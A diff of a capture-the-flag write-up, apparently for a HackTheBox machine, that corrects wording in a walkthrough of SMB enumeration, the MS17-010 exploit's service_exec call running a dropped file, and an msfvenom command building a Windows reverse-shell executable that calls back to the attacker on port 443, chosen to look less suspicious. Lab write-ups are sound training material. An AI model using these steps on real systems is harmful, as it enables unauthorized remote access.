@@ -56,7 +56,7 @@ Nmap done: 1 IP address (1 host up) scanned in 46.91 seconds
 kali@kali:/tmp/x$
 {% endhighlight %}
 
-From the output of the command, we can see that we have access to 5 different shares. The default shares start with the `$` character and are usually not interesting for us as attackers. The other two, however, might contain interesting informaiton. We can check what files they contain using smbclient as demonstrated below. However, they do not appear to contain anything useful.
+From the output of the command, we can see that we have access to 5 different shares. The names of default shares always end with the `$` character and are usually not interesting for us as attackers. The other two, however, might contain interesting information. We can check what files they contain using smbclient as demonstrated below. However, they do not appear to contain anything useful.
 
 {% highlight none linenos %}
 kali@kali:/tmp/x$ @@smbclient '\\10.10.10.40\Share' --no-pass@@
@@ -175,7 +175,7 @@ USERNAME = ''
 PASSWORD = ''
 {% endhighlight %}
 
-At the top of the exploit script we find some comments which include a link to a script named "mysmb.py". This script is needed for the exploit to work and can also be downloaded with `wget` as shown below. Note that an empty username and password is set using the `USERNAME` and `PASSWORD` variables. Sometimes, these aren't required since the target might be configured to allow [null sessions](https://www.blumira.com/glossary/null-session/).
+At the top of the exploit script, we can find some comments which include a link to a script named "mysmb.py". This script is needed for the exploit to work and can also be downloaded with `wget` as shown below. Note that an empty username and password is set using the `USERNAME` and `PASSWORD` variables. Sometimes, these aren't required since the target might be configured to allow [null sessions](https://www.blumira.com/glossary/null-session/).
 
 {% highlight none linenos %}
 kali@kali:/tmp/x$ @@wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py -O mysmb.py@@
@@ -217,7 +217,7 @@ def smb_pwn(conn, arch):
     service_exec(conn, r'cmd /c C:\rs.exe')
 {% endhighlight %}
 
-A reverse shell executable can be generated with [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) by executing `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f exe -o rs.exe`. The `-p` flag selects the payload `windows/shell_reverse_tcp` which is a payload that connects back to us on a specific port, providing us with a shell. This payload is stageless and we can thus simply listen for a connection using a netcat listener. The `LHOST` and `LPORT` parameters specifiy our IP address and the port we want the target to connect to. In our case, we choose port 443 since it is usually used for HTTPS traffic and thus traffic to this port might look less suspicious than a random port. Finally, the `-f` flag is used to specify that we want to output the payload as a [Portable Excecutable](https://en.wikipedia.org/wiki/Portable_Executable) and the `-o` flag specify the output file.
+A reverse shell executable can be generated with [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) by executing `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f exe -o rs.exe`. The `-p` flag selects the payload `windows/shell_reverse_tcp` which is a payload that connects back to us on a specific port, providing us with a shell. This payload is stageless and we can thus simply listen for a connection using a netcat listener. The `LHOST` and `LPORT` parameters specifiy our IP address and the port we want the target to connect to. In our case, we choose port 443 since it is usually used for HTTPS traffic and thus traffic to this port might look less suspicious than a random port. Finally, the `-f` flag is used to specify that we want to output the payload as a [Portable Excecutable](https://en.wikipedia.org/wiki/Portable_Executable) and the `-o` flag specifies the output file `rs.exe`.
  
 {% highlight none linenos %}
 kali@kali:/tmp/x$ @@msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f exe -o rs.exe@@
